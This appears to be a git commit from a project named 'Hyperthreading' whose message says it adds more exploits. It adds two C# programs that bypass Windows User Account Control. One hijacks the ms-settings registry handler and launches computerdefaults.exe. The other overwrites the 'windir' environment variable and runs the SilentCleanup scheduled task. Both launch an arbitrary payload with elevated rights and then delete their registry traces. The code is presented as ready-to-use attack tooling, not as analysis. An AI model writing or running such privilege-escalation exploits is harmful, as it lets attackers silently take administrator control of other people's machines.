821dbc83f6dbcaaa8efea540c4440d7c01953954
NotPhantomX <not.real.phantom.not@gmail.com>
2020-03-13 12:03:39 -0400

    Large update
    Adding more exploits and removing excess.

---
+++ Hyperthreading/Hyperthreading/Defualt.cs
@@ -0,0 +1,80 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Management;
+using Microsoft.Win32;
+using System.Diagnostics;
+
+namespace Hyperthreading
+{
+    class Default
+    {
+        public static void Main(string[] args)
+        {
+
+            string payload = "";
+
+            if (args.Length > 0)
+            {
+                payload = args[0];
+            }
+            else
+            {
+                payload = @"C:\Windows\System32\cmd.exe";
+            }
+
+            try
+            {
+                Microsoft.Win32.RegistryKey key;
+                key = Registry.CurrentUser.CreateSubKey(@"Software\Classes\ms-settings\shell\open\command");
+                key.SetValue("", payload, RegistryValueKind.String);
+                key.SetValue("DelegateExecute", 0, RegistryValueKind.DWord);
+                key.Close();
+            }
+            catch
+            {
+            }
+            System.Threading.Thread.Sleep(5000);
+
+            try
+            {
+                ProcessStartInfo startInfo = new ProcessStartInfo();
+                startInfo.CreateNoWindow = true;
+                startInfo.UseShellExecute = false;
+                startInfo.FileName = "cmd.exe";
+                startInfo.Arguments = @"/c start computerdefaults.exe";
+                Process.Start(startInfo);
+            }
+            catch
+            {
+            }
+
+            DeleteKey();
+        }
+
+        static void DeleteKey()
+        {
+            System.Threading.Thread.Sleep(5000);
+
+            try
+            {
+                var rkey = Registry.CurrentUser.OpenSubKey(@"Software\Classes\ms-settings\shell\open\command", true);
+                if (rkey != null)
+                {
+                    try
+                    {
+                        Registry.CurrentUser.DeleteSubKey(@"Software\Classes\ms-settings\shell\open\command");
+                    }
+                    catch
+                    {
+                    }
+                }
+            }
+            catch
+            {
+            }
+        }
+    }
+}
---
+++ Hyperthreading/Hyperthreading/SilentCleanup.cs
@@ -0,0 +1,80 @@
+﻿using System;
+using Microsoft.Win32;
+using System.Diagnostics;
+
+namespace Hyperthreading
+{
+    class SilentCleanup
+    {
+        static void Main(string[] args)
+        {
+
+            string payload = "";
+
+            if (args.Length > 0)
+            {
+                payload = args[0];
+            }
+            else
+            {
+                payload = @"C:\Windows\System32\cmd.exe";
+            }
+
+            try
+            {
+                RegistryKey key;
+                key = Registry.CurrentUser.CreateSubKey(@"Environment");
+                key.SetValue("windir", "cmd.exe /k " + payload + " & ", RegistryValueKind.String);
+                key.Close();
+            }
+            catch
+            {
+            }
+
+            System.Threading.Thread.Sleep(5000);
+
+            try
+            {
+                ProcessStartInfo startInfo = new ProcessStartInfo();
+                startInfo.CreateNoWindow = true;
+                startInfo.UseShellExecute = false;
+                startInfo.FileName = "schtasks.exe";
+                startInfo.Arguments = @"/Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I";
+                Process.Start(startInfo);
+
+            }
+            catch
+            {
+            }
+
+            DeleteKey();
+
+        }
+
+        static void DeleteKey()
+        {
+            System.Threading.Thread.Sleep(5000);
+
+            try
+            {
+                var rkey = Registry.CurrentUser.OpenSubKey(@"Environment", true);
+
+                // Validate if the Key Exist
+                if (rkey != null)
+                {
+                    try
+                    {
+                        rkey.DeleteValue("windir");
+                        rkey.Close();
+                    }
+                    catch
+                    {
+                    }
+                }
+            }
+            catch
+            {
+            }
+        }
+    }
+}
